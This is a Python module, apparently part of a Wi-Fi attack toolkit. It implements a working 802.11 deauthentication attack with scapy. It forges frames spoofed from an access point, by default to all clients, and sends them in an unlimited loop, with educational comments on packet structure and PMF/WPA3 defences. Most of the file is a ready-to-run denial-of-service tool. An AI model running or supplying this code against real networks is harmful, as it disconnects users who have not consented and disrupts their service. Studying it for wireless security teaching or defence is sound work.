"""
Deauthentication Attack Engine

Crafts and sends 802.11 deauthentication frames for educational purposes.
Demonstrates how deauth attacks work, PMF bypass discussion, and packet structure.
"""

import sys
import time
from typing import Callable, Optional

try:
    from scapy.all import conf, sendp, Dot11, Dot11Deauth, RadioTap
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
    HAVE_SCAPY = True
except ImportError:
    HAVE_SCAPY = False

from sting import DEAUTH_REASON_CODES


class DeauthEngine:
    """
    Engine for sending deauthentication frames.

    Educational focus: explains packet structure, PMF interaction,
    and provides detailed statistics.
    """

    def __init__(
        self,
        interface: str,
        ap_bssid: str,
        ap_ssid: str,
        target_mac: str = "ff:ff:ff:ff:ff:ff",
        channel: int = 1,
        reason_code: int = 7,
        verbose: bool = False,
    ):
        self.interface = interface
        self.ap_bssid = ap_bssid.lower()
        self.ap_ssid = ap_ssid
        self.target_mac = target_mac.lower()
        self.channel = channel
        self.reason_code = reason_code
        self.verbose = verbose

        # Statistics
        self.packets_sent = 0
        self.cycles = 0
        self.start_time = None
        self.end_time = None
        self.errors = 0

        if not HAVE_SCAPY:
            print("[!] Scapy is required for packet crafting.")
            print("    Install with: pip install scapy")
            sys.exit(1)

        # Validate MAC addresses
        self._validate_mac(ap_bssid, "AP BSSID")
        self._validate_mac(target_mac, "Target station")

    def _validate_mac(self, mac: str, label: str):
        """Validate MAC address format."""
        parts = mac.split(":")
        if len(parts) != 6:
            print(f"[!] Invalid {label} MAC: {mac}")
            print("    Expected format: XX:XX:XX:XX:XX:XX")
            sys.exit(1)
        for p in parts:
            try:
                int(p, 16)
            except ValueError:
                print(f"[!] Invalid {label} MAC: {mac}")
                sys.exit(1)

    def _build_packet(self):
        """
        Build the deauthentication packet.

        Packet structure (802.11):
          [RadioTap] - Radio information header
          [Dot11] - 802.11 MAC header
            - addr1: Receiver (target station or broadcast)
            - addr2: Transmitter (usually AP MAC for deauth)
            - addr3: BSSID (usually AP MAC)
          [Dot11Deauth] - Deauthentication frame body
            - reason: Reason code for deauth

        Frame type: Management (type=0), subtype=12 (Deauthentication)
        """
        # Build the packet from layers up
        radiotap = RadioTap()

        dot11 = Dot11(
            type=0,      # Management frame
            subtype=12,  # Deauthentication
            addr1=self.target_mac,  # Receiver (STA or broadcast)
            addr2=self.ap_bssid,     # Transmitter (AP)
            addr3=self.ap_bssid,     # BSSID
        )

        deauth = Dot11Deauth(reason=self.reason_code)

        packet = radiotap / dot11 / deauth

        if self.verbose:
            print(f"[VERBOSE] Packet structure:")
            print(f"  [RadioTap] RadioTap header")
            print(f"  [Dot11] type=0 (Mgmt) subtype=12 (Deauth)")
            print(f"    addr1 (RA/DA) = {self.target_mac}")
            print(f"    addr2 (TA/SA) = {self.ap_bssid}")
            print(f"    addr3 (BSSID) = {self.ap_bssid}")
            print(f"  [Dot11Deauth] reason={self.reason_code} "
                  f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")

        return packet

    def _send_packet(self, packet, count: int = 1):
        """Send packet(s) with error handling."""
        try:
            sendp(
                packet,
                iface=self.interface,
                count=count,
                inter=0.01,
                verbose=False,
            )
            self.packets_sent += count
        except PermissionError:
            print("[!] Permission denied. Run with root/administrator privileges.")
            raise
        except OSError as e:
            if self.verbose:
                print(f"[VERBOSE] Send error: {e}")
            self.errors += 1
        except Exception as e:
            if self.verbose:
                print(f"[VERBOSE] Unexpected error: {e}")
            self.errors += 1

    def _set_channel(self):
        """Set the wireless interface to the target channel (Linux only)."""
        if not sys.platform.startswith("linux"):
            return
        try:
            import subprocess
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.channel)],
                capture_output=True, timeout=3,
            )
        except Exception as e:
            if self.verbose:
                print(f"[VERBOSE] Could not set channel: {e}")

    def run_loop(
        self,
        count: int = -1,
        delay: float = 0.1,
        stop_flag: Optional[Callable[[], bool]] = None,
    ):
        """
        Run deauth attack in a loop.

        Args:
            count: Number of packets per cycle (-1 = unlimited per cycle)
            delay: Delay between cycles in seconds
            stop_flag: Function returning True when stop is requested
        """
        self.start_time = time.time()

        # Set channel
        self._set_channel()

        # Build packet once (reuse)
        if self.verbose:
            print(f"[VERBOSE] Crafting deauth packet...")
        packet = self._build_packet()
        if self.verbose:
            print(f"[VERBOSE] Packet size: {len(packet)} bytes")
            print(f"[VERBOSE] Delay between cycles: {delay}s")
            print()

        # Report target info
        target_str = self.target_mac
        if self.target_mac == "ff:ff:ff:ff:ff:ff":
            target_str = "ALL CLIENTS (broadcast)"
        print(f"[>] Deauth: {self.ap_ssid} [{self.ap_bssid}] -> {target_str}")
        print(f"    Reason: {self.reason_code} "
              f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")
        print(f"    Channel: {self.channel} | Interface: {self.interface}")
        print()

        # Main loop
        while True:
            if stop_flag and stop_flag():
                break

            packets_per_cycle = count if count > 0 else 3
            self._send_packet(packet, count=packets_per_cycle)
            self.cycles += 1

            # Status update every 10 cycles
            if self.cycles % 10 == 0:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[*] Cycle {self.cycles} | {self.packets_sent} packets "
                      f"sent | {rate:.0f} pkt/s | {elapsed:.1f}s elapsed",
                      end="\r")

            time.sleep(delay)

        self.end_time = time.time()

    def print_stats(self):
        """Print final attack statistics and packet details."""
        if self.start_time and self.end_time:
            elapsed = self.end_time - self.start_time
        else:
            elapsed = 0

        print()
        print("[*] === Deauth Attack Summary ===")
        print(f"    Target AP:     {self.ap_ssid} ({self.ap_bssid})")
        print(f"    Target STA:    {self.target_mac}")
        print(f"    Reason code:   {self.reason_code} "
              f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")
        print(f"    Channel:       {self.channel}")
        print(f"    Interface:     {self.interface}")
        print(f"    Cycles:        {self.cycles}")
        print(f"    Packets sent:  {self.packets_sent}")
        print(f"    Errors:        {self.errors}")
        print(f"    Duration:      {elapsed:.1f}s")
        if elapsed > 0:
            print(f"    Avg rate:      {self.packets_sent / elapsed:.0f} pkt/s")
        print()

        # Educational packet breakdown
        if self.verbose:
            print("[*] === Packet Breakdown ===")
            print(f"    [RadioTap]  20-26 bytes (radio metadata)")
            print(f"    [Dot11]     24 bytes (MAC header)")
            print(f"      Frame Control: type=0 (Management) subtype=12 (Deauth)")
            print(f"      addr1 = {self.target_mac}  (Receiver / Destination)")
            print(f"      addr2 = {self.ap_bssid}    (Transmitter / Source)")
            print(f"      addr3 = {self.ap_bssid}    (BSSID)")
            print(f"      Sequence Control: auto-incremented by NIC")
            print(f"    [Dot11Deauth] 2 bytes (Fixed parameters)")
            print(f"      Reason Code: {self.reason_code} "
                  f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")
            print(f"    Total: ~48-50 bytes per packet")
            print()

        # PMF educational note
        print("[*] === Educational Notes ===")
        print("    1. Deauth packets are UNENCRYPTED management frames")
        print("    2. Without PMF (802.11w), APs accept plaintext deauth frames")
        print("    3. With PMF enabled, deauth frames must be encrypted with PTK")
        print("    4. Without the PTK (pre-shared key), forged deauths are rejected")
        print("    5. WPA3 requires PMF - making deauth attacks ineffective")
        print("    6. 2026 WiFi standards mandate PMF for all new certifications")
        print()
